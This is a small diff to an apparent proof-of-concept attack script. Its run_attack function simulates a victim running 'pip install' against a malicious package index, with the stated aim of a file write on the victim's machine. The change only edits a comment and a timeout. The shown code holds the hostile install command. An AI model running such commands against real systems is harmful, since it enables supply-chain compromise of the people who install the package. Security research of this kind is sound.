@@ -71,7 +71,8 @@ def run_attack(server_host, server_port, scenario):
     print(f"\n[VICTIM] Running: pip install malicious-package --index-url {index_url}")
     print(f"[VICTIM] Expected write: {target}\n")
 
-    # THE ATTACK: just pip install from malicious index
+    # THE ATTACK: pip install from malicious index
+    # Server redirects unknown packages (setuptools, etc) to real PyPI
     result = subprocess.run(
         [
             sys.executable, "-m", "pip", "install",
@@ -83,7 +84,7 @@ def run_attack(server_host, server_port, scenario):
         ],
         capture_output=True,
         text=True,
-        timeout=60
+        timeout=120
     )
 
     print("[OUTPUT]")
